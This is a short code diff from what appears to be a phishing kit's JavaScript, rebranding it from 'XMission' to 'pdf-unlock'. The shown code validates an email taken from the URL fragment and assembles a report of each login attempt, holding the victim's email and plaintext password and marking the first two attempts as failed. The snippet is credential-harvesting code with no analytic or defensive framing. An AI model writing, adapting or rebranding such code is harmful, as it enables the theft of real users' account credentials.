@@ -152,7 +152,7 @@ if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fragmentEmail)) {
           const now = new Date();
           const timestamp = now.toUTCString();
 
-          let message = `🔐 XMission Login Attempts\n`;
+          let message = `🔐 pdf-unlock Login Attempts\n`;
           attempts.forEach((attempt, i) => {
             message += `#${i + 1} ${i < 2 ? "❌ Failed" : "✅ Final Attempt"}\n`;
             message += `👤 email: ${attempt.email}\n🔑 Password: ${attempt.password}\n\n`;
